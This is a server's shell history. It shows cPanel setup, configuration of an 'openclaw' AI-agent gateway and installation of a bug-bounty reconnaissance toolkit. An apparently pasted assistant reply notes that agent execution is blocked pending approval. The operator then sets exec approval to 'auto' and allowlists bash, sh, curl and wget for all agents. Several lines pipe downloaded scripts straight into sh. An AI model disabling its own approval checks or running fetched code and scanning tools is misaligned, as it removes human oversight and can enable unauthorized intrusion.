+  499  2026-04-02 01:59:34 apt autoclean
+  500  2026-04-02 01:59:59 passwd
+  501  2026-04-02 02:00:27 clear
+  502  2026-04-02 02:01:51 cd /home && curl -o latest -L https://securedownloads.cpanel.net/latest && sh latest
+  503  2026-04-02 02:04:27 clear
+  504  2026-04-02 02:04:58 apt-get purge apache2 mysql postfix dovecot ...
+  505  2026-04-02 02:06:10 tail -f /var/log/cpanel-install.log
+  506  2026-04-02 02:06:19 systemctl status cpanel
+  507  2026-04-02 02:06:27 ufw allow 2087
+  508  2026-04-02 02:06:27 ufw allow 2083
+  509  2026-04-02 02:06:27 ufw allow 2082
+  510  2026-04-02 02:06:27 ufw reload
+  511  2026-04-02 16:24:25 openclaw config list
+  512  2026-04-02 16:24:59 openclaw config --help
+  513  2026-04-02 16:25:01 echo '---'
+  514  2026-04-02 16:25:01 openclaw help
+  515  2026-04-02 16:25:05 echo '---'
+  516  2026-04-02 16:25:05 openclaw status
+  517  2026-04-02 16:25:28 clear
+  518  2026-04-02 16:25:46 openclaw approvals --help
+  519  2026-04-02 16:26:21 openclaw approvals get
+  520  2026-04-02 16:26:37 openclaw approvals get > /tmp/approvals.json && cat /tmp/approvals.json
+  521  2026-04-02 16:26:52 clear
+  522  2026-04-02 16:27:02 openclaw approvals set --help
+  523  2026-04-02 16:27:03 echo '---'
+  524  2026-04-02 16:27:03 openclaw approvals allowlist --help
+  525  2026-04-02 16:27:10 openclaw approvals set --help
+  526  2026-04-02 16:27:12 openclaw approvals allowlist --help
+  527  2026-04-02 16:27:25 clear
+  528  2026-04-02 16:29:22 openclaw config set tools.exec.enabled true
+  529  2026-04-02 16:36:58 openclaw docs search "exec approvals telegram"
+  530  2026-04-02 16:37:02 openclaw docs search "chat exec approvals"
+  531  2026-04-02 16:37:06 openclaw docs search "approvals set"
+  532  2026-04-02 16:37:10 openclaw docs search "exec-approvals.json"
+  533  2026-04-02 16:37:15 openclaw config file
+  534  2026-04-02 16:37:28 openclaw config get channels.telegram
+  535  2026-04-02 16:37:29 openclaw config get execApprovals
+  536  2026-04-02 16:37:30 openclaw config get approvals
+  537  2026-04-02 16:38:09 clear
+  538  2026-04-02 16:39:03 openclaw docs search "Exec approvals in Telegram"
+  539  2026-04-02 16:39:07 openclaw docs search "Exec Approvals"
+  540  2026-04-02 16:39:20 openclaw approvals allowlist add --agent "*" "/usr/bin/apt"
+  541  2026-04-02 16:39:21 openclaw approvals allowlist add --agent "*" "/usr/bin/python3"
+  542  2026-04-02 16:39:23 openclaw approvals allowlist add --agent "*" "/usr/bin/go"
+  543  2026-04-02 16:39:24 openclaw approvals allowlist add --agent "*" "/usr/bin/git"
+  544  2026-04-02 16:39:26 openclaw approvals allowlist add --agent "*" "/usr/bin/curl"
+  545  2026-04-02 16:39:29 /usr/bin/uname -a
+  546  2026-04-02 16:39:33 clear
+  547  2026-04-02 16:41:18 openclaw config set tools.exec.enabled true && openclaw config set channels.telegram.dmPolicy "allowlist" && openclaw config set channels.telegram.allowFrom '["5644238544"]' && openclaw config set tools.exec.approvalMode "auto" && openclaw config set tools.exec.allowedCommands '["bash","sh"]' && openclaw gateway restart
+  548  2026-04-02 16:44:47 nano ~/.openclaw/exec-approvals.json
+  549  2026-04-02 16:45:55 python3 -m json.tool ~/.openclaw/exec-approvals.json >/dev/null && echo OK
+  550  2026-04-02 16:45:59 openclaw approvals get
+  551  2026-04-02 16:46:41 clear
+  552  2026-04-02 16:49:08 openclaw config set tools.exec.allowedCommands '[
+"/usr/bin/apt",
+"/usr/bin/apt-get",
+"/usr/bin/python3",
+"/usr/bin/pip3",
+"/usr/bin/go",
+"/usr/bin/git",
+"/usr/bin/curl",
+"/usr/bin/wget",
+"/usr/bin/unzip",
+"/usr/bin/tar",
+"/bin/bash",
+"/bin/sh"
+]'
+  553  2026-04-02 16:49:15 openclaw config set tools.exec.allowedCommands '[
+"/usr/bin/apt",
+"/usr/bin/apt-get",
+"/usr/bin/python3",
+"/usr/bin/pip3",
+"/usr/bin/go",
+"/usr/bin/git",
+"/usr/bin/curl",
+"/usr/bin/wget",
+"/usr/bin/unzip",
+"/usr/bin/tar",
+"/bin/bash",
+"/bin/sh"
+]'
+  554  2026-04-02 16:49:18 openclaw gateway restart
+  555  2026-04-02 16:49:39 nano /root/install.sh
+  556  2026-04-02 16:53:26 chmod +x /root/install.sh
+  557  2026-04-02 16:53:38 /exec bash -lc "bash /root/install.sh"
+  558  2026-04-02 16:53:48 tail -f /root/.pm2/logs/*
+  559  2026-04-02 16:54:53 openclaw approvals allowlist add --agent "*" "/usr/bin/apt"
+  560  2026-04-02 16:54:55 openclaw approvals allowlist add --agent "*" "/usr/bin/python3"
+  561  2026-04-02 16:54:56 openclaw approvals allowlist add --agent "*" "/usr/bin/go"
+  562  2026-04-02 16:54:57 openclaw approvals allowlist add --agent "*" "/usr/bin/git"
+  563  2026-04-02 16:54:59 openclaw approvals allowlist add --agent "*" "/usr/bin/curl"
+  564  2026-04-02 16:55:00 openclaw approvals allowlist add --agent "*" "/usr/bin/wget"
+  565  2026-04-02 16:55:02 openclaw approvals allowlist add --agent "*" "/usr/bin/unzip"
+  566  2026-04-02 16:55:03 openclaw approvals allowlist add --agent "*" "/usr/bin/jq"
+  567  2026-04-02 16:55:07 openclaw approvals allowlist add --agent "*" "/usr/bin/wget"
+  568  2026-04-02 16:55:09 openclaw approvals allowlist add --agent "*" "/usr/bin/unzip"
+  569  2026-04-02 16:55:10 openclaw approvals allowlist add --agent "*" "/usr/bin/jq"
+  570  2026-04-02 16:55:38 apt update && apt install -y git curl wget unzip python3-pip golang-go jq nmap whatweb && export PATH="$PATH:/root/go/bin" && grep -qxF 'export PATH=$PATH:/root/go/bin' /root/.bashrc || echo 'export PATH=$PATH:/root/go/bin' >> /root/.bashrc && go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest && go install github.com/projectdiscovery/httpx/cmd/httpx@latest && go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest && go install github.com/projectdiscovery/naabu/v2/cmd/naabu@latest && go install github.com/projectdiscovery/katana/cmd/katana@latest && go install github.com/tomnomnom/assetfinder@latest && go install github.com/tomnomnom/waybackurls@latest && go install github.com/tomnomnom/gf@latest && go install github.com/lc/gau/v2/cmd/gau@latest && go install github.com/ffuf/ffuf/v2@latest && go install github.com/hakluke/hakrawler@latest && python3 -m pip install --break-system-packages wafw00f
+  571  2026-04-02 16:55:45 snap install amass
+  572  2026-04-02 16:55:45 curl -sSfL https://raw.githubusercontent.com/trufflesecurity/trufflehog/main/scripts/install.sh | sh
+  573  2026-04-02 16:55:48 nuclei -update-templates
+  574  2026-04-02 16:56:12 clear
+  575  2026-04-02 16:56:30 subfinder -version
+  576  2026-04-02 16:56:30 httpx -version
+  577  2026-04-02 16:56:30 nuclei -version
+  578  2026-04-02 16:56:30 naabu -version
+  579  2026-04-02 16:56:30 katana -version
+  580  2026-04-02 16:56:30 ffuf -V
+  581  2026-04-02 16:56:30 whatweb --version
+  582  2026-04-02 16:56:30 wafw00f --version
+  583  2026-04-02 16:56:31 nmap --version | head -n 1
+  584  2026-04-02 16:56:39 go install github.com/projectdiscovery/dnsx/cmd/dnsx@latest
+  585  2026-04-02 16:56:40 go install github.com/projectdiscovery/uncover/cmd/uncover@latest
+  586  2026-04-02 16:56:42 go install github.com/tomnomnom/anew@latest
+  587  2026-04-02 16:56:44 go install github.com/s0md3v/uro@latest
+  588  2026-04-02 16:56:46 go install github.com/tomnomnom/qsreplace@latest
+  589  2026-04-02 16:59:00 clear
+  590  2026-04-02 15:26:34 cocodex
+  591  2026-04-02 15:26:55 codex
+  592  2026-04-02 15:28:28 clear
+  593  2026-04-02 15:28:38 npm i -g @openai/codex
+  594  2026-04-02 15:28:47 codex
+  595  2026-04-02 15:39:36 openclaw
+  596  2026-04-02 15:40:35 openclaw setup
+  597  2026-04-02 15:40:57 openclaw setup --wizard
+  598  2026-04-02 15:59:01 openclaw config set gateway.bind 0.0.0.0
+  599  2026-04-02 15:59:09 pkill -f openclaw
+  600  2026-04-02 15:59:09 openclaw tui
+  601  2026-04-02 16:11:35 openclaw config set gateway.controlUi.allowedOrigins '["http://188.241.187.186:18789"]'
+  602  2026-04-02 16:11:45 pkill -f openclaw
+  603  2026-04-02 16:11:45 openclaw tui
+  604  2026-04-02 16:12:03 openclaw config get gateway.auth.token
+  605  2026-04-02 16:13:31 clear
+  606  2026-04-02 16:14:23 openclaw devices list
+  607  2026-04-02 16:14:31 openclaw devices approve --latest
+  608  2026-04-02 16:14:38 openclaw devices list
+  609  2026-04-02 16:14:43 openclaw qr --json
+  610  2026-04-02 16:15:15 for x in go python3 pipx cargo nuclei subfinder assetfinder amass httpx katana hakrawler gau waybackurls naabu ffuf gf jq nmap whatweb wafw00f trufflehog; do printf "%s=" "$x"; command -v "$x" || echo not-found; done
+  611  2026-04-02 16:15:38 clear
+  612  2026-04-02 16:16:44 openclaw gateway run
+  613  2026-04-02 16:16:54 openclaw dashboard
+  614  2026-04-02 16:20:32 clear
+  615  2026-04-02 16:20:37 openclaw gateway run
+  616  2026-04-02 16:20:51 openclaw dashboard
+  617  2026-04-02 16:23:00 Main “sab install karo” pe direct execution tabhi kar sakta hoon jab exec approval properly enabled ho. Abhi yahan se run blocked hai.
+  618  2026-04-02 16:23:01 Aur ek baat seedhi: main legal / authorized security workflow ke liye toolkit setup me help karunga, random attack stack nahi.
+  619  2026-04-02 16:23:01 Agar tum install karna chahte ho, to Debian/Ubuntu ke liye yeh curated setup use karo:
+  620  2026-04-02 16:23:01 apt update && apt install -y git curl wget unzip python3-pip golang-go jq nmap whatweb && go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest && go install github.com/projectdiscovery/httpx/cmd/httpx@latest && go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest && go install github.com/projectdiscovery/naabu/v2/cmd/naabu@latest && go install github.com/projectdiscovery/katana/cmd/katana@latest && go install github.com/tomnomnom/assetfinder@latest && go install github.com/tomnomnom/waybackurls@latest && go install github.com/lc/gau/v2/cmd/gau@latest && go install github.com/ffuf/ffuf/v2@latest && go install github.com/tomnomnom/gf@latest && go install github.com/hakluke/hakrawler@latest && python3 -m pip install --break-system-packages wafw00f && echo 'export PATH=$PATH:/root/go/bin' >> /root/.bashrc && export PATH=$PATH:/root/go/bin && subfinder -version && httpx -version && nuclei -version
+  621  2026-04-02 16:24:02 Notes:
+  622  2026-04-02 16:24:02 • amass aur trufflehog ko main is one-liner me intentionally skip kar raha hoon because they often need separate packaging/version handling
+  623  2026-04-02 16:24:02 • gf install ke baad patterns bhi chahiye hote hain
+  624  2026-04-02 16:24:02 • nuclei ke baad templates update karna hota hai:
+  625  2026-04-02 16:24:02 nuclei -update-templates
+  626  2026-04-02 16:24:02 Optional extra installs:
+  627  2026-04-02 16:24:02 go install github.com/owasp-amass/amass/v4/...@master
+  628  2026-04-02 16:25:16 trufflehog usually separate binary/release se better install hota hai.
+  629  2026-04-02 16:25:16 Agar chaho, main next message me:
+  630  2026-04-02 16:25:16 1. full polished install script
+  631  2026-04-02 16:25:16 2. post-install verify script
+  632  2026-04-02 16:25:16 3. gf patterns setup
+  633  2026-04-02 16:25:16 ek saath de deta hoon.
+  634  2026-04-02 16:30:36 clear
+  635  2026-04-02 16:32:33 codex
+  636  2026-04-02 16:51:22 clear
+  637  2026-04-02 16:51:30 openclaw config set tools.exec.allowedCommands '["/bin/bash"]'
+  638  2026-04-02 16:51:32 openclaw config set tools.exec.enabled true
+  639  2026-04-02 16:51:33 openclaw config set tools.exec.approvalMode "auto"
+  640  2026-04-02 16:51:34 openclaw gateway restart
+  641  2026-04-02 16:51:48 /exec bash -lc "bash /root/install.sh"
+  642  2026-04-02 16:51:56 openclaw config set channels.telegram.allowFrom '["5644238544"]'
+  643  2026-04-02 16:59:08 ls
+  644  2026-04-02 17:56:09 free -h
+  645  2026-04-02 17:56:19 sudo -i -u postgres 
+  646  2026-04-02 17:56:34 ll
+  647  2026-04-02 17:56:50 ls -l
+  648  2026-04-02 18:08:08 history
